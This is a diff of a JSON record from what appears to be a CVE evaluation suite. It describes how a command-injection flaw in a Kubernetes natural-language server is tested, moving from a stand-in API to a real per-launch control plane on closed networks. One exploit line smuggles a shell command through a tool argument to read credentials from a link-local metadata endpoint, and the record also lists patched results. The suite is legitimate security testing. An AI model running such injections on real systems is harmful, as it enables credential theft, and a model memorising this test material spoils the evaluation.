@@ -151214,22 +151214,22 @@
           },
           {
             "place_id": "kube-config",
-            "reason": "the benign call runs kubectl (process_natural_language('get pods') -> 'kubectl get pods'), and kubectl's own default-kubeconfig loading reads this place at $HOME/.kube/config; something other than the flaw therefore reaches it, so it is left out (Proof: a tool's own function the benign call surfaces)",
+            "reason": "the server-side kubectl reads this place at $HOME/.kube/config as its own function (kubectl's default kubeconfig loading), and the launch mounts the control plane's admin.conf there so the benign call (process_natural_language('get pods') -> 'kubectl get pods') reaches the cluster; something other than the flaw therefore reaches it, so it is left out (Proof: a tool's own function the benign call surfaces)",
             "route_checked": null
           }
         ],
         "launch_options": [
           {
-            "option": "SSL_CERT_FILE",
-            "value": "/etc/ssl/extra-ca.pem",
-            "reason": "trust setting: the server's kubectl must trust the fixture certificate authority the Kubernetes API stand-in's certificate chains to, so TLS to the stand-in succeeds; set through the planting host's trust declaration, not a flaw requirement",
-            "documentation": "rule v11 Calibration and ADR 034: the card records the stand-in trust setting among the launch options"
+            "option": "planting_host.has_network",
+            "value": "true",
+            "reason": "The server's kubectl reaches the launch's Kubernetes control plane over the network: the planting layer creates the launch's closed network for the namespace holder, and the builder (kubernetes_injection_env) connects the holder to the control plane's own closed network, which Docker refuses for a container on `none`. Both networks are closed (internal, isolated gateway), so the launch reaches neither the host, its local network nor the Internet (ADR 034). Not a flaw requirement: the exploits run their reads in the server's own container.",
+            "documentation": "evals/cve/backends/kubernetes_detection.py: kubernetes_injection_env refuses a planting host with no network; evals/cve/closed_network.py creates both networks."
           }
         ],
         "seeded_in_layout": [],
         "seeded_outside_layout": [
           {
-            "item": "kubectl v1.37.2 binary installed at /usr/local/bin/kubectl in both images",
+            "item": "kubectl v1.37.2 binary installed at /usr/local/bin/kubectl in both images, fetched from dl.k8s.io and checked against its published SHA-256 (ADD --checksum)",
             "reason": "the real software the server shells out to; docs/INSTALLATION.md lists kubectl as a prerequisite, so the deployment carries it. It is not reached by any kept place and surfaces no nonce",
             "returned_by": [],
             "used_by_default_by": [
@@ -151245,60 +151245,41 @@
           },
           {
             "item": "ca-certificates (apt) in both images",
-            "reason": "TLS root store used only to download the pinned kubectl during the build; a standard base package, not reached by any kept place and used by no tool",
+            "reason": "TLS root store used only to fetch the pinned server from GitHub (pip's git+https install) during the build; a standard base package, not reached by any kept place and used by no tool",
             "returned_by": [],
             "used_by_default_by": []
           },
           {
-            "item": "kubeconfig at /tmp/.kube/config ($HOME/.kube/config) in both images: a Config with one cluster (server https://45.55.0.10:443), a context and a user carrying a fixed bearer token",
-            "reason": "kubectl's default configuration file, so the real software (kubectl) runs in a deployment where it works and the benign call reaches the Kubernetes API; this is the kube-config catalogue place path, which the target no longer keeps because the benign call's kubectl reads it as its own function. It carries no nonce, no secret, and no value taken from the machine",
+            "item": "kubeconfig at /tmp/.kube/config ($HOME/.kube/config): the admin.conf kubeadm generates for each launch (`kubeadm init phase kubeconfig admin`, documented at https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-init-phase/), read out of the control plane into a host file of mode 0644 and mounted read-only. It names the API server by its address on the control plane's network and carries a client certificate of that launch's cluster authority. The images bake only the directory /tmp/.kube (mode 0777), so kubectl writes its discovery cache under the planted account",
+            "reason": "kubectl's default configuration file, so the real software (kubectl) reaches the launch's control plane and the benign call answers. This is the kube-config catalogue place path, which the target does not keep because the benign call's kubectl reads it as its own function. It carries no nonce and no value taken from the machine, and it is generated per launch, so nothing dated is baked",
             "returned_by": [],
             "used_by_default_by": [
               "process_natural_language"
             ]
-          }
-        ],
-        "stand_ins": [
+          },
           {
-            "stand_in": {
-              "replaces": "the Kubernetes API server the configured kubectl contacts, at the cluster endpoint https://45.55.0.10:443",
-              "reason": "the container deployment has no Kubernetes cluster (networks are closed and the kit runs no API server in the holder network namespace), so a stand-in serves the API responses kubectl needs for 'kubectl get pods'; it is served under the endpoint's real address with a certificate chaining to the fixture authority kubectl trusts via SSL_CERT_FILE (ADR 034)",
-              "file": "evals/docker/Dockerfile.stand-in",
-              "capture": "evals/stand_ins/45.55.0.10.json",
-              "outputs": [
-                {
-                  "request": "GET /api?timeout=32s",
-                  "source": "software_sources",
-                  "citation": "APIVersions discovery response (versions: ['v1']); Kubernetes API documentation (kubernetes.io/docs/reference/using-api/api-concepts, API discovery) and the Kubernetes API reference (apimachinery meta/v1 types)"
-                },
-                {
-                  "request": "GET /apis?timeout=32s",
-                  "source": "software_sources",
-                  "citation": "APIGroupList discovery response with no API groups beyond core; Kubernetes API documentation (kubernetes.io/docs/reference/using-api/api-concepts, API discovery) and the Kubernetes API reference (apimachinery meta/v1 types)"
-                },
-                {
-                  "request": "GET /api/v1?timeout=32s",
-                  "source": "software_sources",
-                  "citation": "core/v1 APIResourceList carrying the pods resource (verbs, shortName 'po') per the core/v1 Pod API reference; Kubernetes API documentation (kubernetes.io/docs/reference/using-api/api-concepts, API discovery) and the Kubernetes API reference (apimachinery meta/v1 types)"
-                },
-                {
-                  "request": "GET /api/v1/namespaces/default/pods?limit=500",
-                  "source": "software_sources",
-                  "citation": "core/v1 PodList with empty items, the documented response for a namespace with no pods; Kubernetes API documentation (kubernetes.io/docs/reference/using-api/api-concepts, API discovery) and the Kubernetes API reference (apimachinery meta/v1 types)"
-                },
-                {
-                  "request": "any other path (per-scheme default)",
-                  "source": "software_sources",
-                  "citation": "apimachinery meta/v1 Status with reason NotFound, code 404, the API's error for an unknown path; Kubernetes API documentation (kubernetes.io/docs/reference/using-api/api-concepts, API discovery) and the Kubernetes API reference (apimachinery meta/v1 types)"
-                }
-              ]
-            },
+            "item": "Kubernetes control plane container (image mcp-auditor-cve-kube-control-plane, evals/docker/Dockerfile.kube-control-plane): upstream kube-apiserver, kube-controller-manager and kube-scheduler v1.37.2 and etcd 3.7.0, stood for each launch by evals/cve/backends/kubernetes.py. Its entrypoint runs kubeadm's file phases (certs, kubeconfigs, static pod manifests) with the container's address as the advertise address, starts the four components with the manifests' command lines, waits for /readyz and creates the kubeadm:cluster-admins binding with super-admin.conf, as `kubeadm init` does. No kubelet runs, so the cluster has no node: `get nodes` is empty and a created pod stays Pending. It runs as 65534:65534 under the suite's confinement (--cap-drop ALL, --security-opt no-new-privileges, --pids-limit 256) with no capability added, its certificates, manifests and etcd data on tmpfs",
+            "reason": "The real software the server's kubectl talks to: docs/INSTALLATION.md lists a configured kubectl, so the deployment reaches a cluster. kubelet needs a container runtime and privileges the confinement does not give, a limit the confinement sets. It runs in its own network namespace, never in the namespace holder, since the API server can be made to fetch addresses and the holder's loopback carries the link-local sentinels; on its own network it reaches nothing of the target. It holds no nonce and surfaces none",
+            "returned_by": [
+              "process_natural_language",
+              "advanced_kubernetes_query"
+            ],
+            "used_by_default_by": [
+              "process_natural_language",
+              "advanced_kubernetes_query"
+            ]
+          },
+          {
+            "item": "The control plane's closed network mcp-auditor-cve-kube-net-<random hex> (created through evals/cve/closed_network.py: internal, isolated gateway, label mcp-auditor-cve), joined by the control plane and connected to the namespace holder, whose network namespace the target shares",
+            "reason": "Lets the server's kubectl reach the API server by the address admin.conf names, with no name lookup, while the control plane stays out of the holder's namespace. Closed, so neither the target nor the control plane reaches the host, its local network or the Internet (ADR 034). The network's name is not visible inside the container",
             "returned_by": [],
             "used_by_default_by": [
-              "process_natural_language"
+              "process_natural_language",
+              "advanced_kubernetes_query"
             ]
           }
         ],
+        "stand_ins": [],
         "software_releases": [
           {
             "software": "kubectl",
@@ -151307,10 +151288,22 @@
             "source": "docs/INSTALLATION.md prerequisites list 'kubectl CLI installed and configured' and name no version; v1.37.2 is the current stable release per https://dl.k8s.io/release/stable.txt on the calibration day 2026-11-05"
           },
           {
-            "software": "Kubernetes API server",
+            "software": "Kubernetes (kube-apiserver, kube-controller-manager, kube-scheduler)",
             "release": "v1.37.2",
-            "day": "2026-11-05",
-            "source": "docs/INSTALLATION.md names no Kubernetes cluster version; v1.37.2 is the current stable Kubernetes release on the calibration day 2026-11-05 (https://dl.k8s.io/release/stable.txt), matching the kubectl client; the stand-in serves the core/v1 API discovery and an empty PodList, stable across releases"
+            "day": "2026-11-13",
+            "source": "docs/INSTALLATION.md names no Kubernetes distribution or version, so the control plane is upstream Kubernetes at the stable release https://dl.k8s.io/release/stable.txt gave on the repair day 2026-11-13 (v1.37.2, the version the images' kubectl already carries); each binary is fetched from dl.k8s.io and checked against its published SHA-256 (evals/docker/Dockerfile.kube-control-plane)"
+          },
+          {
+            "software": "kubeadm",
+            "release": "v1.37.2",
+            "day": "2026-11-13",
+            "source": "The control plane's file phases run kubeadm of the same stable release as the components (https://dl.k8s.io/release/stable.txt on 2026-11-13), checked against its published SHA-256"
+          },
+          {
+            "software": "etcd",
+            "release": "3.7.0",
+            "day": "2026-11-13",
+            "source": "The version build/dependencies.yaml of Kubernetes v1.37.2 names (also kubeadm's DefaultEtcdVersion at that release), read on 2026-11-13; the release tarball from github.com/etcd-io/etcd is checked against its SHA-256 (ADD --checksum)"
           }
         ],
         "fallback_scope": null,
@@ -151342,7 +151335,7 @@
           "process_natural_language(args='[\"kubectl version --client ; python3 -c \\\\\"import urllib.request as u;print(u.urlopen(\\'http://169.254.170.23/v1/credentials\\',timeout=5).read().decode())\\\\\"\"]', kwargs=\"{}\")"
         ],
         "benign_call": "process_natural_language(args='[\"get pods\"]', kwargs=\"{}\", query=\"get pods\")",
-        "patched_result": "On v1.2.0 process_natural_language takes a required 'query' argument and run_kubectl_command parses with shlex.split and runs subprocess.run(shell=False). Each exploit call passes args/kwargs with no 'query' (failing the changed input schema) or, were it accepted, has its shell metacharacters passed as inert kubectl arguments, so no nonce surfaces. The benign call (query='get pods') runs 'kubectl get pods' against the configured cluster stand-in and returns its output (an empty pod list for the default namespace, success true) with is_error false.",
+        "patched_result": "On v1.2.0 process_natural_language takes a required 'query' argument and run_kubectl_command parses with shlex.split and runs subprocess.run(shell=False). Each exploit call passes args/kwargs with no 'query' (failing the changed input schema) or, were it accepted, has its shell metacharacters passed as inert kubectl arguments, so no nonce surfaces. The benign call (query='get pods') runs 'kubectl get pods' against the launch's Kubernetes control plane, which has no node, and returns success true with an empty result (no pod in the default namespace) with is_error false.",
         "attempts": 2
       },
       {
